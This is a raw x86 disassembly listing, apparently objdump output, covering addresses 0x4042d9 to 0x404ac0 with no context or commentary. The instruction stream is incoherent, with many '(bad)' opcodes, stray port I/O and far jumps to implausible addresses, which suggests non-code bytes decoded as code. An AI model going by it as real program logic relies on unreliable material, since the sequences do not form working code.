  4042d9:	ret    0xb999
  4042dc:	mov    ch,0x59
  4042de:	dec    eax
  4042df:	jns    0x404302
  4042e1:	stos   DWORD PTR es:[edi],eax
  4042e2:	xchg   ebx,ebp
  4042e4:	cmp    eax,DWORD PTR [ecx+0x4f]
  4042e7:	sub    BYTE PTR [ecx+esi*8-0x1e],bh
  4042eb:	and    eax,0x384b2406
  4042f0:	jp     0x4042bf
  4042f2:	int    0xb0
  4042f4:	pop    es
  4042f5:	loop   0x40428c
  4042f7:	ja     0x4042cb
  4042f9:	mov    ecx,0xfe868c32
  4042fe:	leave  
  4042ff:	xor    eax,0x57cdb54c
  404304:	push   esi
  404305:	pusha  
  404306:	adc    ebx,DWORD PTR [ebx]
  404308:	bound  ebp,QWORD PTR [ebp+0x12]
  40430b:	pusha  
  40430c:	retf   
  40430d:	outs   dx,DWORD PTR ds:[esi]
  40430e:	ret    
  40430f:	cmp    eax,0x6fa48de7
  404314:	pop    esi
  404315:	pop    esp
  404316:	sahf   
  404317:	push   ds
  404318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404319:	js     0x404315
  40431b:	(bad)
  40431e:	fstp   TBYTE PTR [ebx+0x6ecc3ca]
  404324:	mov    ebx,0x80c646dc
  404329:	pop    es
  40432a:	xchg   edx,eax
  40432b:	lods   al,BYTE PTR ds:[esi]
  40432c:	pop    edx
  40432d:	mov    dh,0xa2
  40432f:	aad    0x8e
  404331:	pop    ebx
  404332:	repz out dx,al
  404334:	and    dh,BYTE PTR [edi+0x4dfa5661]
  40433a:	mov    esp,0x6c47df6f
  40433f:	mov    ds:0xe0c50061,al
  404344:	sbb    dl,bl
  404346:	push   ss
  404347:	aam    0x49
  404349:	std    
  40434a:	mov    dl,0x1b
  40434c:	xor    edx,DWORD PTR [ecx-0x64]
  40434f:	cli    
  404350:	retf   
  404351:	and    bh,BYTE PTR [edi+0x72e0c8bf]
  404357:	adc    bh,BYTE PTR [ebp-0x7a5fad97]
  40435d:	jmp    0x4042f3
  40435f:	icebp  
  404360:	sub    edx,eax
  404362:	sub    al,0x49
  404364:	in     eax,dx
  404365:	test   eax,0xeb52bac7
  40436a:	pop    ds
  40436b:	inc    esi
  40436c:	and    al,0x98
  40436e:	nop
  40436f:	arpl   WORD PTR [edi],di
  404371:	jae    0x4043d9
  404373:	jle    0x404385
  404375:	mov    dl,0x65
  404377:	loop   0x4043f7
  404379:	retf   0x1074
  40437c:	das    
  40437d:	sub    al,0x8b
  40437f:	xor    bl,bh
  404381:	add    dh,BYTE PTR [edi]
  404383:	lahf   
  404384:	adc    eax,0x5f
  404387:	sbb    al,0x24
  404389:	dec    ebp
  40438a:	test   eax,0xf900c90a
  40438f:	mov    ebx,0x1192fb2f
  404394:	fs pop ebx
  404396:	mov    ebp,DWORD PTR [ebx-0x22]
  404399:	jno    0x40434f
  40439b:	mov    BYTE PTR [esi-0x3c4ac035],ch
  4043a1:	xor    BYTE PTR [edi+0x59d83cb4],ah
  4043a7:	retf   0x5dfd
  4043aa:	mov    eax,0xe02e702f
  4043af:	dec    ebx
  4043b0:	js     0x404358
  4043b2:	dec    ebp
  4043b3:	loopne 0x4043cc
  4043b5:	push   ecx
  4043b6:	dec    esp
  4043b7:	mov    ebp,0x4987cd99
  4043bc:	jbe    0x4043bd
  4043be:	ret    
  4043bf:	mov    ch,0xc2
  4043c1:	add    BYTE PTR [eax-0x33],ch
  4043c4:	inc    ebp
  4043c5:	jge    0x404407
  4043c7:	and    ebp,eax
  4043c9:	push   eax
  4043ca:	jbe    0x4043a2
  4043cc:	cmp    eax,0x44
  4043cf:	add    eax,0xe28e1a33
  4043d4:	sbb    BYTE PTR [esi-0x677c0a3a],cl
  4043da:	fmul   DWORD PTR [eax+0x50fc1018]
  4043e0:	push   eax
  4043e1:	(bad)  
  4043e2:	dec    esi
  4043e3:	int3   
  4043e4:	(bad)  
  4043e5:	fs das 
  4043e7:	sahf   
  4043e8:	stos   DWORD PTR es:[edi],eax
  4043e9:	fs das 
  4043eb:	mov    cs,WORD PTR [edi+edi*1-0x6f]
  4043ef:	iret   
  4043f0:	arpl   WORD PTR [esi-0xf647594],di
  4043f6:	aaa    
  4043f7:	add    BYTE PTR [edx+ebx*1],ch
  4043fa:	scas   al,BYTE PTR es:[edi]
  4043fb:	push   esi
  4043fc:	or     BYTE PTR [ebp-0x5b],bh
  4043ff:	je     0x404409
  404401:	lods   al,BYTE PTR ds:[esi]
  404402:	pop    eax
  404403:	cmp    ch,BYTE PTR [ebx+ecx*4]
  404406:	aad    0x4e
  404408:	pop    es
  404409:	xchg   esp,eax
  40440a:	lea    ecx,[eax]
  40440c:	jae    0x404414
  40440e:	sub    eax,0xa8b0979c
  404413:	adc    DWORD PTR [eax],esi
  404415:	out    0x2f,al
  404417:	int    0xa6
  404419:	push   cs
  40441a:	pop    ebp
  40441b:	lahf   
  40441c:	iret   
  40441d:	inc    ebp
  40441e:	xor    dl,BYTE PTR [esi+0x36cc03c1]
  404424:	fidiv  WORD PTR [ebx-0x65]
  404427:	mov    ebp,0x84c27ac2
  40442c:	outs   dx,DWORD PTR ds:[esi]
  40442d:	mov    dh,BYTE PTR [ebx]
  40442f:	add    esi,DWORD PTR [edi]
  404431:	fcompp 
  404433:	stos   DWORD PTR es:[edi],eax
  404434:	jo     0x4043ef
  404436:	clc    
  404437:	das    
  404438:	inc    BYTE PTR ds:0xc3c23031
  40443e:	push   ebx
  40443f:	adc    al,dl
  404441:	pop    edi
  404442:	in     eax,0x6
  404444:	sbb    al,0x6a
  404446:	out    0xab,al
  404448:	push   eax
  404449:	out    0x86,al
  40444b:	mov    dh,0x11
  40444d:	xor    bl,cl
  40444f:	adc    BYTE PTR [eax],bh
  404451:	popf   
  404452:	das    
  404453:	mov    dl,0xc5
  404455:	xchg   BYTE PTR [ebp+0xb53f82],bh
  40445b:	and    esi,edx
  40445d:	loopne 0x404451
  40445f:	push   eax
  404460:	out    0x0,eax
  404462:	pop    esi
  404463:	sub    DWORD PTR [edx-0x7c0c5f0b],edi
  404469:	popf   
  40446a:	adc    dh,0xac
  40446d:	cmp    cl,BYTE PTR [eax+0x4dfb952e]
  404473:	(bad)  
  404476:	xor    edi,DWORD PTR [eax]
  404478:	lea    ebx,[ecx+0x43ef08cb]
  40447e:	sub    eax,0xbfff906a
  404483:	sahf   
  404484:	pushf  
  404485:	js     0x4044e5
  404487:	xchg   ecx,eax
  404488:	xlat   BYTE PTR ds:[ebx]
  404489:	aam    0x72
  40448b:	dec    ebp
  40448c:	cmp    DWORD PTR [edx-0x2a88605a],edi
  404492:	dec    esp
  404493:	mov    eax,0x4540bbaa
  404498:	pushf  
  404499:	or     DWORD PTR [ebp+0x6ab4f1ea],esp
  40449f:	xchg   edi,eax
  4044a0:	dec    esi
  4044a1:	xchg   DWORD PTR [eax+0x15],ecx
  4044a4:	mov    al,0x14
  4044a6:	fs data16 ja 0x40450b
  4044aa:	sub    eax,0x9d35c02
  4044af:	loope  0x404440
  4044b1:	out    0x1c,eax
  4044b3:	call   0x4571:0x66ed3e2a
  4044ba:	sbb    eax,0x67b3a0c2
  4044bf:	fmul   st,st(7)
  4044c1:	lea    ebp,[edx]
  4044c3:	dec    ecx
  4044c4:	fcomp  QWORD PTR [eax]
  4044c6:	xchg   esp,eax
  4044c7:	mov    ch,0xf5
  4044c9:	aaa    
  4044ca:	dec    ecx
  4044cb:	dec    ecx
  4044cc:	mov    esi,0x573fb5a9
  4044d1:	jp     0x404462
  4044d3:	mov    al,0xf9
  4044d5:	scas   eax,DWORD PTR es:[edi]
  4044d6:	cmp    BYTE PTR [edi],0x1f
  4044d9:	mov    esp,0x15386dfb
  4044de:	sbb    eax,DWORD PTR [ebx]
  4044e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e1:	fdivr  QWORD PTR [edi-0x29]
  4044e4:	addr16 sbb al,0xdf
  4044e7:	stos   DWORD PTR es:[edi],eax
  4044e8:	inc    esp
  4044e9:	stc    
  4044ea:	stos   BYTE PTR es:[edi],al
  4044eb:	les    ebx,FWORD PTR [ecx]
  4044ed:	sbb    DWORD PTR [edi-0x5c9d1010],0x6d
  4044f4:	inc    esp
  4044f5:	or     BYTE PTR [eax+ebp*2],dl
  4044f8:	cli    
  4044f9:	xor    esi,DWORD PTR [ebx+0x1e6c7020]
  4044ff:	and    BYTE PTR [eax-0x799661e3],al
  404505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404506:	sub    eax,0x55d4fb23
  40450b:	push   ebx
  40450c:	fs jns 0x404528
  40450f:	addr16 inc ecx
  404511:	fwait
  404512:	aad    0x79
  404514:	scas   al,BYTE PTR es:[edi]
  404515:	retf   0x32aa
  404518:	and    eax,DWORD PTR [eax-0x248242c]
  40451e:	neg    DWORD PTR [ebp-0x6710a8d5]
  404524:	xchg   ebx,eax
  404525:	add    al,0xf7
  404527:	mov    DWORD PTR [eax-0x26],esp
  40452a:	rcr    cl,1
  40452c:	stc    
  40452d:	fwait
  40452e:	aas    
  40452f:	gs dec eax
  404531:	xor    al,0xde
  404533:	test   DWORD PTR [esi+0x41],esi
  404536:	inc    ecx
  404537:	repz in eax,0x65
  40453a:	jp     0x404562
  40453c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40453e:	add    al,0x5f
  404540:	adc    BYTE PTR [ebp+0x256b2ba7],cl
  404546:	rcr    eax,0x26
  404549:	mov    ch,0x9
  40454b:	dec    ecx
  40454c:	push   ss
  40454d:	sub    DWORD PTR [esi],edx
  40454f:	je     0x40454f
  404551:	xor    ch,BYTE PTR [ebx+0x587d47cd]
  404557:	cld    
  404558:	xchg   edi,eax
  404559:	ja     0x404519
  40455b:	or     eax,0xe16c955e
  404560:	inc    ecx
  404561:	les    esi,FWORD PTR [ebp+0x62]
  404564:	in     al,0xe1
  404566:	inc    ebx
  404567:	mov    bl,0x9e
  404569:	add    al,0xa6
  40456b:	sbb    eax,0x63cc3874
  404570:	ins    DWORD PTR es:[edi],dx
  404571:	add    al,0x8c
  404573:	adc    al,0x61
  404575:	xchg   esp,eax
  404576:	adc    al,0x25
  404578:	stos   BYTE PTR es:[edi],al
  404579:	inc    ebp
  40457a:	inc    eax
  40457b:	sbb    BYTE PTR [ebp-0x70354ec0],cl
  404581:	cs jg  0x40456d
  404584:	sbb    eax,0xe7607274
  404589:	test   eax,0x9d396d7c
  40458e:	xchg   esp,eax
  40458f:	mov    cl,0x79
  404591:	dec    eax
  404592:	mov    cl,0x19
  404594:	cmp    BYTE PTR [eax+ecx*1-0x55229564],0xe1
  40459c:	jmp    0xb121a1d7
  4045a1:	les    ebp,FWORD PTR [esi+0x13372e50]
  4045a7:	sub    dh,BYTE PTR [ecx-0x45315b2f]
  4045ad:	mov    bh,0x2c
  4045af:	leave  
  4045b0:	imul   edi,edi,0xe19808ec
  4045b6:	adc    DWORD PTR [ebp+ebx*1-0x3a],ecx
  4045ba:	in     al,0xd0
  4045bc:	jecxz  0x404596
  4045be:	pop    esp
  4045bf:	(bad)  
  4045c0:	mov    edi,0x2fde8bd7
  4045c5:	cli    
  4045c6:	scas   eax,DWORD PTR es:[edi]
  4045c7:	iret   
  4045c8:	pushf  
  4045c9:	sub    al,0x7b
  4045cb:	sbb    BYTE PTR [esp+eiz*8+0x55],bh
  4045cf:	jns    0x40463b
  4045d1:	sub    bh,BYTE PTR [esi+0x25]
  4045d4:	rol    BYTE PTR [ecx],0x42
  4045d7:	xor    eax,ecx
  4045d9:	mov    al,ds:0xc7764984
  4045de:	outs   dx,BYTE PTR ds:[esi]
  4045df:	mov    WORD PTR [edx-0x58434c33],?
  4045e5:	pop    edi
  4045e6:	out    dx,al
  4045e7:	pop    esp
  4045e8:	sbb    eax,0x541d4c16
  4045ed:	stos   DWORD PTR es:[edi],eax
  4045ee:	xor    ebp,0xc3c8a287
  4045f4:	xchg   esp,eax
  4045f5:	cld    
  4045f6:	sbb    ebx,ebp
  4045f8:	pop    es
  4045f9:	xchg   ebp,eax
  4045fa:	arpl   bx,bp
  4045fc:	test   eax,0xbe6b0793
  404601:	xchg   edx,eax
  404602:	add    DWORD PTR [ebx+0x12],ebp
  404605:	mov    ah,0x39
  404607:	ficomp DWORD PTR [edx+ecx*4+0x1c]
  40460b:	test   eax,0x3e9ffc6f
  404610:	in     eax,0x9f
  404612:	bound  eax,QWORD PTR ds:0x283ec2b
  404618:	pop    edi
  404619:	mov    dl,0xa0
  40461b:	pop    es
  40461c:	pop    ebx
  40461d:	inc    esp
  40461e:	add    DWORD PTR [ebx-0x399a34b6],eax
  404624:	push   cs
  404625:	sub    BYTE PTR [eax],al
  404627:	jns    0x4045ed
  404629:	push   edx
  40462a:	cwde   
  40462b:	adc    eax,DWORD PTR [esi]
  40462d:	jecxz  0x404616
  40462f:	(bad)  
  404630:	or     al,0x72
  404632:	jp     0x4045b6
  404634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404635:	mov    esi,DWORD PTR [ecx+0x7b3b67a6]
  40463b:	(bad)  [esi-0x14a57a90]
  404641:	ins    DWORD PTR es:[edi],dx
  404642:	jae    0x404668
  404644:	push   edx
  404645:	ja     0x4045ef
  404647:	test   al,0x74
  404649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40464a:	leave  
  40464b:	sub    DWORD PTR [ebx+ecx*4],edx
  40464e:	inc    edi
  40464f:	not    BYTE PTR [eax+ebx*8-0x15]
  404653:	xchg   esp,eax
  404654:	push   esp
  404655:	xchg   edi,eax
  404656:	stos   BYTE PTR es:[edi],al
  404657:	mov    ds:0xd888a6b,eax
  40465c:	pusha  
  40465d:	mov    ebx,0x104ffb9f
  404662:	stos   DWORD PTR es:[edi],eax
  404663:	add    edx,DWORD PTR [eax+0x21]
  404666:	xchg   ecx,eax
  404667:	fcom   QWORD PTR [eax]
  404669:	cmp    ch,dh
  40466b:	retf   0x262b
  40466e:	iret   
  40466f:	xchg   ebx,eax
  404670:	test   al,0x2e
  404672:	push   eax
  404673:	lea    esp,[eax]
  404675:	(bad)  
  404676:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404678:	or     al,0xc2
  40467a:	xchg   edx,eax
  40467b:	das    
  40467c:	jno    0x4046eb
  40467e:	cmp    eax,0x2ddb187f
  404683:	mov    edx,0xb0a9bfc9
  404688:	mov    cl,0x7e
  40468a:	push   ecx
  40468b:	ficomp WORD PTR [ecx]
  40468d:	cli    
  40468e:	js     0x40469a
  404690:	jnp    0x40464a
  404692:	leave  
  404693:	cmp    DWORD PTR [edx+0x559b22b5],edi
  404699:	pop    ds
  40469a:	or     eax,0xd5c2b8ee
  40469f:	test   BYTE PTR [ebx-0x66],al
  4046a2:	push   ecx
  4046a3:	push   ss
  4046a4:	sti    
  4046a5:	pushw  es
  4046a7:	es adc eax,0x471e95b3
  4046ad:	imul   esp,DWORD PTR [esi-0x39],0x77
  4046b1:	xchg   esp,eax
  4046b2:	ja     0x40465b
  4046b4:	pop    esi
  4046b5:	or     bl,bl
  4046b7:	dec    esp
  4046b8:	idiv   BYTE PTR [ecx]
  4046ba:	xchg   ecx,eax
  4046bb:	jmp    0x40473b
  4046bd:	xor    al,0xa3
  4046bf:	add    al,0x8
  4046c1:	das    
  4046c2:	pushf  
  4046c3:	fimul  DWORD PTR [esi+esi*1+0x2cca6251]
  4046ca:	mov    DWORD PTR [esi-0x3d],edx
  4046cd:	sbb    ah,ch
  4046cf:	push   edi
  4046d0:	push   ss
  4046d1:	pop    eax
  4046d2:	(bad)  
  4046d3:	out    dx,al
  4046d4:	jl     0x40473c
  4046d6:	int3   
  4046d7:	jnp    0x4046c9
  4046d9:	(bad)  
  4046da:	test   al,0x6a
  4046dc:	xor    eax,0xbccf1880
  4046e1:	add    al,0x57
  4046e3:	fiadd  WORD PTR [esi-0xcb52522]
  4046e9:	lock or ebp,DWORD PTR cs:[edx+edx*4-0x10fd842]
  4046f2:	dec    eax
  4046f3:	xchg   DWORD PTR [eax],eax
  4046f5:	xchg   ebx,eax
  4046f6:	or     ah,BYTE PTR [ebp+0x58]
  4046f9:	xchg   esp,eax
  4046fa:	sub    edi,DWORD PTR [esi-0x128b2e82]
  404700:	sar    DWORD PTR [ecx+edx*8],1
  404703:	sub    al,0x77
  404705:	(bad)  
  404706:	pop    ds
  404707:	and    DWORD PTR [ecx+0x72],esi
  40470a:	addr16 loopne 0x4046c7
  40470d:	push   ecx
  40470e:	mov    al,dl
  404710:	mov    ebx,0x8029d5a9
  404715:	mov    edi,0xdeed14d9
  40471a:	fwait
  40471b:	dec    edi
  40471c:	adc    edi,eax
  40471e:	sub    esi,DWORD PTR [ebp+0x7eb9fe03]
  404724:	dec    edi
  404725:	pushf  
  404726:	xchg   BYTE PTR [edi+0x2f],bh
  404729:	ss int3 
  40472b:	enter  0xf7b1,0xfe
  40472f:	int    0xf1
  404731:	inc    ebx
  404732:	frstor [esi+eax*4+0x217335e4]
  404739:	lea    edx,[edi+edi*4-0x69226555]
  404740:	popa   
  404741:	fwait
  404742:	adc    DWORD PTR [ebp-0x49],eax
  404745:	imul   ebx,DWORD PTR [ebx],0x29
  404748:	push   0x63
  40474a:	sbb    ecx,edi
  40474c:	xlat   BYTE PTR ds:[ebx]
  40474d:	sub    eax,0x9d98eb51
  404752:	fsub   QWORD PTR [ebp-0x36]
  404755:	and    eax,0x9f79ed57
  40475a:	cmp    DWORD PTR [ebp-0x68],ebp
  40475d:	scas   eax,DWORD PTR es:[edi]
  40475e:	sub    eax,0x45894de4
  404763:	pop    esi
  404764:	mov    al,ds:0x184362fe
  404769:	inc    ebp
  40476a:	in     al,dx
  40476b:	and    DWORD PTR [edi+ebx*2],esp
  40476e:	hlt    
  40476f:	loop   0x40472b
  404771:	fs mov esp,0x9225ee53
  404777:	xor    ch,BYTE PTR [esp+ebp*4+0x4e]
  40477b:	jl     0x4047f4
  40477d:	and    edi,edx
  40477f:	gs mov esp,0xc164a3f6
  404785:	inc    eax
  404786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404787:	sub    al,0xe8
  404789:	shr    eax,cl
  40478b:	out    dx,eax
  40478c:	not    DWORD PTR [eax+0x6130fded]
  404792:	(bad)
  404796:	lea    ecx,[edx+esi*8+0x7d6a8d73]
  40479d:	push   edx
  40479e:	xchg   BYTE PTR [ebx],ah
  4047a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047a1:	push   edx
  4047a2:	mov    ds:0xd89f3ee6,eax
  4047a7:	mov    ch,0x59
  4047a9:	add    cl,bl
  4047ab:	dec    edi
  4047ac:	ds mov dh,dh
  4047af:	and    BYTE PTR [ebp+0x306c11d],ch
  4047b5:	(bad)  
  4047b6:	sbb    BYTE PTR [ebx+0x230847ad],bl
  4047bc:	jp     0x40474f
  4047be:	popa   
  4047bf:	das    
  4047c0:	pop    ds
  4047c1:	jb     0x40477b
  4047c3:	sub    al,0x1
  4047c5:	dec    ebx
  4047c6:	mov    ah,0x11
  4047c8:	in     eax,dx
  4047c9:	outs   dx,BYTE PTR ds:[esi]
  4047ca:	fisubr WORD PTR [esi+0x52]
  4047cd:	mov    ds:0x29895b66,eax
  4047d2:	in     al,0x26
  4047d4:	popf   
  4047d5:	aam    0xfa
  4047d7:	push   eax
  4047d8:	test   dh,bl
  4047da:	cmp    eax,0x3effd91c
  4047df:	mov    ecx,0x885858f0
  4047e4:	push   ebp
  4047e5:	sbb    BYTE PTR [edx+0x4e1e58de],al
  4047eb:	mov    edi,0xef0ecb58
  4047f0:	mov    esi,DWORD PTR [ebx-0x543d2210]
  4047f6:	outs   dx,BYTE PTR ds:[esi]
  4047f7:	pop    edi
  4047f8:	aad    0xd2
  4047fa:	punpckhbw mm4,mm3
  4047fd:	in     eax,0xe7
  4047ff:	arpl   WORD PTR [ecx],si
  404801:	leave  
  404802:	inc    edi
  404803:	or     DWORD PTR [edi],ebx
  404805:	push   edx
  404806:	and    eax,0x84548b03
  40480b:	xchg   ecx,eax
  40480c:	add    esp,eax
  40480e:	inc    edx
  40480f:	sahf   
  404810:	ins    BYTE PTR es:[edi],dx
  404811:	dec    ebp
  404812:	jge    0x404856
  404814:	mov    dh,0x6c
  404816:	pop    ds
  404817:	mov    ds:0x6c63e17b,al
  40481c:	addr16 dec esp
  40481e:	(bad)  
  40481f:	jge    0x40489d
  404821:	ror    BYTE PTR [ebx],1
  404823:	sbb    eax,0x902a9a85
  404828:	or     DWORD PTR [esi+ebx*8],0x28bf5e41
  40482f:	cld    
  404830:	push   0x656b825b
  404835:	mov    al,ds:0xe0406c5a
  40483a:	pop    ebx
  40483b:	dec    eax
  40483c:	push   ecx
  40483d:	dec    edi
  40483e:	jbe    0x404881
  404840:	xlat   BYTE PTR ds:[ebx]
  404841:	jo     0x4048b8
  404843:	fiadd  DWORD PTR [esi+eiz*8-0x58]
  404847:	push   cs
  404848:	sar    DWORD PTR [eax+edi*2+0x205e4609],cl
  40484f:	sbb    BYTE PTR [edi+0x7506dcb0],0x2d
  404856:	mov    ebx,0x3d981fba
  40485b:	iret   
  40485c:	jge    0x4048a3
  40485e:	ret    0x79ed
  404861:	mov    esp,0xab18bbab
  404866:	add    esi,0x29
  404869:	and    eax,0x181438c5
  40486e:	ror    DWORD PTR [ecx+0x7d],1
  404871:	mov    al,ds:0xef717c1a
  404876:	sub    al,0x5a
  404878:	mov    edi,0xd4529641
  40487d:	das    
  40487e:	adc    dl,BYTE PTR [edi-0x50]
  404881:	call   0xf17a40bc
  404886:	sub    DWORD PTR [edi-0x62],0x89d06cc2
  40488d:	mov    ebx,ecx
  40488f:	lds    esp,FWORD PTR [edi+0xcc886d9]
  404895:	int    0x83
  404897:	leave  
  404898:	dec    eax
  404899:	enter  0xe0f,0x3f
  40489d:	stc    
  40489e:	sub    DWORD PTR [ecx],0xb1a9d3d9
  4048a4:	dec    eax
  4048a5:	loopne 0x4048cf
  4048a7:	shl    esi,cl
  4048a9:	push   edi
  4048aa:	jo     0x4048ad
  4048ac:	in     eax,dx
  4048ad:	mov    esi,0xf5b784c3
  4048b2:	data16 jecxz 0x4048ae
  4048b5:	inc    edi
  4048b6:	ja     0x404934
  4048b8:	jg     0x404855
  4048ba:	out    dx,al
  4048bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048bc:	add    eax,0x6fb51372
  4048c1:	enter  0xef6a,0x25
  4048c5:	jmp    0x44a1cd70
  4048ca:	aam    0xc1
  4048cc:	mov    bl,0x13
  4048ce:	cmc    
  4048cf:	sub    al,0x6
  4048d1:	mov    ecx,ecx
  4048d3:	push   edx
  4048d4:	call   FWORD PTR [ebx+0x2f7a0a99]
  4048da:	xchg   edx,eax
  4048db:	xchg   ecx,eax
  4048dc:	into   
  4048dd:	arpl   WORD PTR [ebx-0x6933df0],di
  4048e3:	mov    ebx,0xbe8a8454
  4048e8:	ret    
  4048e9:	pushw  es
  4048eb:	sbb    eax,0xa08cef92
  4048f0:	out    0x3e,eax
  4048f2:	retf   
  4048f3:	inc    edx
  4048f4:	test   bl,dh
  4048f6:	outs   dx,BYTE PTR ds:[esi]
  4048f7:	push   ebp
  4048f8:	jecxz  0x4048a5
  4048fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048fb:	sbb    BYTE PTR [esi-0x4a],ch
  4048fe:	imul   ebp,DWORD PTR [ebx],0xffffff93
  404901:	mov    edi,0x9800978d
  404906:	repz jno 0x4048b1
  404909:	adc    al,0xf1
  40490b:	dec    eax
  40490c:	stc    
  40490d:	inc    edi
  40490e:	pushf  
  40490f:	dec    ecx
  404910:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  404912:	dec    edx
  404913:	sub    ebx,DWORD PTR [edx+eiz*1-0x5c]
  404917:	cdq    
  404918:	(bad)  
  404919:	push   ebp
  40491a:	jo     0x4048a7
  40491c:	popf   
  40491d:	aas    
  40491e:	cmp    DWORD PTR [eax+0xaea702b],0xffffff89
  404925:	jno    0x404938
  404927:	xor    eax,0x6a0fe338
  40492c:	int3   
  40492d:	mov    ds:0xe73c6d1e,eax
  404932:	push   cs
  404933:	test   eax,0xa8bc9842
  404938:	xor    DWORD PTR [esi+0x50],edx
  40493b:	push   es
  40493c:	inc    ebp
  40493d:	ret    
  40493e:	xchg   ebp,eax
  40493f:	mov    bh,0xc3
  404941:	loope  0x404905
  404943:	stos   BYTE PTR es:[edi],al
  404944:	dec    esi
  404945:	pop    ss
  404946:	jae    0x4048ce
  404948:	sti    
  404949:	in     al,0x83
  40494b:	adc    BYTE PTR [edx-0x26],ch
  40494e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40494f:	jmp    0x919b:0x181aa968
  404956:	mov    ch,0xe2
  404958:	add    ebp,0x12949c8f
  40495e:	test   eax,0x8ea8bacf
  404963:	inc    ebp
  404964:	and    al,0x36
  404966:	dec    edx
  404967:	inc    eax
  404968:	and    al,0x3d
  40496a:	jge    0x404969
  40496c:	and    eax,0xb799fa1
  404971:	arpl   WORD PTR [esi-0x4e3f91f2],di
  404977:	repnz repz shr DWORD PTR [edx+0x7d],cl
  40497c:	cmp    al,0x57
  40497e:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  404980:	add    DWORD PTR [eax],eax
  404982:	mov    DWORD PTR [ecx],esi
  404984:	push   ebx
  404985:	aam    0xa5
  404987:	adc    eax,0x34f6e33
  40498c:	out    dx,eax
  40498d:	imul   ecx,DWORD PTR [edx+0x34],0xefda68f0
  404994:	push   cs
  404995:	fninit 
  404997:	sti    
  404998:	cmp    ecx,edx
  40499a:	outs   dx,BYTE PTR ds:[esi]
  40499b:	in     al,0x45
  40499d:	mov    dh,0x94
  40499f:	pop    ss
  4049a0:	jmp    0x404960
  4049a2:	sub    eax,0x78980899
  4049a7:	ret    0xe9f3
  4049aa:	lea    eax,[eax]
  4049ac:	push   eax
  4049ad:	xor    edi,DWORD PTR [edi]
  4049af:	arpl   WORD PTR [edi+0x67290ca9],di
  4049b5:	mov    ds:0x7f8221a1,eax
  4049ba:	imul   eax,DWORD PTR ds:0x7c19eae8,0x4e
  4049c1:	lahf   
  4049c2:	mov    esi,0x213e5106
  4049c7:	xor    bl,BYTE PTR [ecx+0x4f84eec7]
  4049cd:	jb     0x4049aa
  4049cf:	ret    
  4049d0:	sub    eax,0xd2cfbeae
  4049d5:	mov    ch,0x48
  4049d7:	cld    
  4049d8:	mov    ah,0x44
  4049da:	pop    ds
  4049db:	mov    ah,0xa3
  4049dd:	adc    eax,0x55aade2
  4049e2:	ss ret 0x5c3c
  4049e6:	in     eax,dx
  4049e7:	mov    ds:0x10c3974c,al
  4049ec:	cmc    
  4049ed:	add    BYTE PTR [ebp-0xf],cl
  4049f0:	stos   DWORD PTR es:[edi],eax
  4049f1:	inc    esi
  4049f2:	cmp    BYTE PTR [edi],al
  4049f4:	ins    BYTE PTR es:[edi],dx
  4049f5:	in     al,0x15
  4049f7:	cdq    
  4049f8:	adc    dl,0x28
  4049fb:	pushf  
  4049fc:	mov    eax,0x8de41f2b
  404a01:	arpl   WORD PTR [ebx+0x52],cx
  404a04:	out    dx,al
  404a05:	sub    esi,DWORD PTR [eax+0x1f]
  404a08:	jb     0x4049bc
  404a0a:	into   
  404a0b:	ds loopne 0x404a1d
  404a0e:	mov    ax,?
  404a11:	add    BYTE PTR [edx+ecx*4-0xbd85f2d],0x3c
  404a19:	loopne 0x4049ea
  404a1b:	ror    ah,1
  404a1d:	mov    eax,ds:0x956842b4
  404a22:	std    
  404a23:	adc    dh,dl
  404a25:	jae    0x404a08
  404a27:	sub    BYTE PTR [ebp+0x65380266],bl
  404a2d:	outs   dx,DWORD PTR ds:[esi]
  404a2e:	inc    edi
  404a2f:	nop
  404a30:	sub    ecx,ebp
  404a32:	lock and edi,ebp
  404a35:	and    DWORD PTR [edx-0x3fea8ae9],0xfffffff4
  404a3c:	test   BYTE PTR [ecx-0x1138a32c],0x61
  404a43:	inc    edi
  404a44:	sbb    DWORD PTR [ebx],edx
  404a46:	shl    DWORD PTR [ebp+0x1f],0xd
  404a4a:	add    BYTE PTR [edi+0x44f804a5],dl
  404a50:	mov    ebp,0xb7cfa51f
  404a55:	mov    dh,0x11
  404a57:	inc    esp
  404a58:	in     eax,0xad
  404a5a:	(bad)  
  404a5b:	in     al,dx
  404a5c:	ins    BYTE PTR es:[edi],dx
  404a5d:	or     eax,0x9e689d1a
  404a62:	ficomp DWORD PTR [ecx+ecx*8-0x2e98bb55]
  404a69:	or     eax,0x836e928d
  404a6e:	mov    esi,DWORD PTR [ebp+0x3d]
  404a71:	or     al,BYTE PTR ds:0x6b668511
  404a77:	clc    
  404a78:	or     BYTE PTR [ebp-0x2b],0x85
  404a7c:	pop    edx
  404a7d:	ret    
  404a7e:	test   BYTE PTR [ecx-0x40],ch
  404a81:	in     eax,dx
  404a82:	dec    esp
  404a83:	sbb    ecx,DWORD PTR [esi]
  404a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a86:	repnz add BYTE PTR [ebx-0x39674585],0xc7
  404a8e:	mov    eax,DWORD PTR ds:0x2bc98c50
  404a94:	and    eax,ecx
  404a96:	mov    esp,0xed65629c
  404a9b:	jmp    0xe1d85fc0
  404aa0:	jb     0x404a53
  404aa2:	sbb    DWORD PTR [edx-0x44049363],ebp
  404aa8:	shl    BYTE PTR [ecx+0x7158e2b8],1
  404aae:	icebp  
  404aaf:	shl    dh,1
  404ab1:	mov    ds:0x986842bc,eax
  404ab6:	ret    
  404ab7:	hlt    
  404ab8:	rcr    DWORD PTR [ebx+ecx*2-0x181a7e81],0xac
  404ac0:	mov    DWORD PTR [edi+0x7b],edx
